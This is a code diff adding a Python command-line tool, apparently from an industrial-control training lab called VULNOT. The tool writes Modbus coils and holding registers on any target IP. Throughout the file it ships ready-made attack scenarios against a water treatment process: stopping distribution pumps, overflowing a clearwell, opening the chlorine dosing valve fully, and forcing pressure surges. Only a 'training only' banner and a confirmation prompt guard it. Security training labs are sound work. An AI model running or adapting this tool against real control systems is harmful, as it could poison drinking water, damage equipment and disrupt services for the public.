@@ -1,0 +1,249 @@
+#!/usr/bin/env python3
+"""
+VULNOT Modbus Register Writer
+Write to holding registers and coils on Modbus devices
+⚠️ FOR TRAINING PURPOSES ONLY
+"""
+
+import socket
+import struct
+import click
+from rich.console import Console
+from rich.panel import Panel
+from rich.prompt import Confirm
+
+console = Console()
+
+# Attack scenarios for guided learning
+ATTACK_SCENARIOS = {
+    'stop-pumps': {
+        'name': 'Stop Distribution Pumps',
+        'description': 'Turn off distribution pumps causing pressure drop',
+        'target_unit': 3,
+        'actions': [
+            {'type': 'coil', 'address': 0, 'value': 0, 'desc': 'Stop Pump P301'},
+            {'type': 'coil', 'address': 1, 'value': 0, 'desc': 'Stop Pump P302'},
+        ],
+        'impact': 'Distribution pressure will drop, potentially causing service disruption'
+    },
+    'overflow-tank': {
+        'name': 'Overflow Clearwell',
+        'description': 'Manipulate pump speeds to overflow the clearwell',
+        'target_unit': 3,
+        'actions': [
+            {'type': 'register', 'address': 3, 'value': 0, 'desc': 'Stop P301 output'},
+            {'type': 'register', 'address': 4, 'value': 0, 'desc': 'Stop P302 output'},
+        ],
+        'impact': 'Clearwell will overflow as inflow exceeds outflow'
+    },
+    'chemical-attack': {
+        'name': 'Manipulate Chemical Dosing',
+        'description': 'Change chlorine dosing to dangerous levels',
+        'target_unit': 2,
+        'actions': [
+            {'type': 'register', 'address': 9, 'value': 10000, 'desc': 'Max chemical valve opening'},
+        ],
+        'impact': 'Chlorine levels could become unsafe for consumption'
+    },
+    'pressure-surge': {
+        'name': 'Pressure Surge Attack',
+        'description': 'Create pressure surge by rapid pump speed changes',
+        'target_unit': 3,
+        'actions': [
+            {'type': 'register', 'address': 3, 'value': 10000, 'desc': 'Max P301 speed'},
+            {'type': 'register', 'address': 4, 'value': 10000, 'desc': 'Max P302 speed'},
+        ],
+        'impact': 'Could cause pipe damage or equipment failure'
+    }
+}
+
+def write_single_register(ip: str, port: int, unit_id: int, address: int, value: int, timeout: float = 2.0) -> bool:
+    """Write a single holding register"""
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(timeout)
+    
+    try:
+        sock.connect((ip, port))
+        
+        # Function code 0x06 - Write Single Register
+        transaction_id = 1
+        protocol_id = 0
+        length = 6
+        function_code = 0x06
+        
+        request = struct.pack('>H H H B B H H',
+                             transaction_id, protocol_id, length,
+                             unit_id, function_code, address, value)
+        
+        sock.send(request)
+        response = sock.recv(1024)
+        
+        if len(response) >= 12:
+            resp_fc = response[7]
+            if resp_fc == function_code:
+                # Echo response indicates success
+                return True
+            elif resp_fc == (function_code | 0x80):
+                exception_code = response[8]
+                console.print(f"[red]Modbus exception: {exception_code}[/]")
+                return False
+        
+        return False
+        
+    finally:
+        sock.close()
+
+def write_single_coil(ip: str, port: int, unit_id: int, address: int, value: bool, timeout: float = 2.0) -> bool:
+    """Write a single coil"""
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(timeout)
+    
+    try:
+        sock.connect((ip, port))
+        
+        # Function code 0x05 - Write Single Coil
+        transaction_id = 1
+        protocol_id = 0
+        length = 6
+        function_code = 0x05
+        coil_value = 0xFF00 if value else 0x0000
+        
+        request = struct.pack('>H H H B B H H',
+                             transaction_id, protocol_id, length,
+                             unit_id, function_code, address, coil_value)
+        
+        sock.send(request)
+        response = sock.recv(1024)
+        
+        if len(response) >= 12:
+            resp_fc = response[7]
+            if resp_fc == function_code:
+                return True
+            elif resp_fc == (function_code | 0x80):
+                exception_code = response[8]
+                console.print(f"[red]Modbus exception: {exception_code}[/]")
+                return False
+        
+        return False
+        
+    finally:
+        sock.close()
+
+@click.command()
+@click.option('--target', '-t', help='Target IP address')
+@click.option('--port', '-p', default=502, help='Modbus port (default: 502)')
+@click.option('--unit', '-u', default=1, help='Unit ID (default: 1)')
+@click.option('--register', '-r', type=int, help='Register address to write')
+@click.option('--value', '-v', type=int, help='Value to write')
+@click.option('--coil', '-c', type=int, help='Coil address to write')
+@click.option('--on', is_flag=True, help='Set coil ON')
+@click.option('--off', is_flag=True, help='Set coil OFF')
+@click.option('--scenario', '-s', type=click.Choice(list(ATTACK_SCENARIOS.keys())), help='Run predefined attack scenario')
+@click.option('--list-scenarios', '-l', is_flag=True, help='List available attack scenarios')
+def main(target: str, port: int, unit: int, register: int, value: int, coil: int, on: bool, off: bool, scenario: str, list_scenarios: bool):
+    """VULNOT Modbus Register Writer - ⚠️ FOR TRAINING ONLY"""
+    
+    console.print("\n[bold red]╔═══════════════════════════════════════╗[/]")
+    console.print("[bold red]║     VULNOT Modbus Register Writer     ║[/]")
+    console.print("[bold red]║    ⚠️  FOR TRAINING PURPOSES ONLY     ║[/]")
+    console.print("[bold red]╚═══════════════════════════════════════╝[/]\n")
+    
+    # List scenarios
+    if list_scenarios:
+        console.print("[bold yellow]Available Attack Scenarios:[/]\n")
+        for key, sc in ATTACK_SCENARIOS.items():
+            console.print(Panel(
+                f"[cyan]{sc['description']}[/]\n\n"
+                f"[yellow]Target Unit:[/] {sc['target_unit']}\n"
+                f"[yellow]Actions:[/] {len(sc['actions'])}\n"
+                f"[red]Impact:[/] {sc['impact']}",
+                title=f"[bold]{key}[/] - {sc['name']}"
+            ))
+        console.print("\n[dim]Usage: vulnot-write -s <scenario> -t <target_ip>[/]\n")
+        return
+    
+    # Run scenario
+    if scenario:
+        if not target:
+            console.print("[red]Error: Target IP required for scenario[/]")
+            return
+            
+        sc = ATTACK_SCENARIOS[scenario]
+        console.print(Panel(
+            f"[cyan]{sc['description']}[/]\n\n"
+            f"[red]Impact:[/] {sc['impact']}",
+            title=f"[bold red]Attack: {sc['name']}[/]"
+        ))
+        
+        if not Confirm.ask("[yellow]Execute this attack?[/]"):
+            console.print("[dim]Attack cancelled[/]")
+            return
+        
+        console.print("\n[bold]Executing attack...[/]\n")
+        
+        for action in sc['actions']:
+            console.print(f"  [cyan]→[/] {action['desc']}...", end=" ")
+            
+            if action['type'] == 'coil':
+                success = write_single_coil(target, port, sc['target_unit'], 
+                                           action['address'], bool(action['value']))
+            else:
+                success = write_single_register(target, port, sc['target_unit'],
+                                               action['address'], action['value'])
+            
+            if success:
+                console.print("[green]SUCCESS[/]")
+            else:
+                console.print("[red]FAILED[/]")
+        
+        console.print("\n[bold yellow]Attack complete! Check the HMI dashboard to observe the impact.[/]\n")
+        return
+    
+    # Manual write
+    if not target:
+        console.print("[red]Error: Target IP required. Use -t <IP>[/]")
+        console.print("[dim]Or use --list-scenarios to see predefined attacks[/]\n")
+        return
+    
+    if coil is not None:
+        # Write coil
+        if not on and not off:
+            console.print("[red]Error: Specify --on or --off for coil write[/]")
+            return
+        
+        coil_value = on
+        console.print(f"[yellow]Target:[/] {target}:{port}")
+        console.print(f"[yellow]Unit ID:[/] {unit}")
+        console.print(f"[yellow]Writing Coil:[/] {coil} = {'ON' if coil_value else 'OFF'}")
+        
+        if not Confirm.ask("\n[yellow]Execute write?[/]"):
+            console.print("[dim]Cancelled[/]")
+            return
+        
+        success = write_single_coil(target, port, unit, coil, coil_value)
+        
+    elif register is not None and value is not None:
+        # Write register
+        console.print(f"[yellow]Target:[/] {target}:{port}")
+        console.print(f"[yellow]Unit ID:[/] {unit}")
+        console.print(f"[yellow]Writing Register:[/] {register} = {value}")
+        
+        if not Confirm.ask("\n[yellow]Execute write?[/]"):
+            console.print("[dim]Cancelled[/]")
+            return
+        
+        success = write_single_register(target, port, unit, register, value)
+        
+    else:
+        console.print("[red]Error: Specify -r <register> -v <value> or -c <coil> --on/--off[/]")
+        console.print("[dim]Or use -s <scenario> for predefined attacks[/]\n")
+        return
+    
+    if success:
+        console.print("\n[bold green]✓ Write successful![/]")
+        console.print("[dim]Check the HMI dashboard to observe the change[/]\n")
+    else:
+        console.print("\n[bold red]✗ Write failed![/]\n")
+
+if __name__ == '__main__':
+    main()
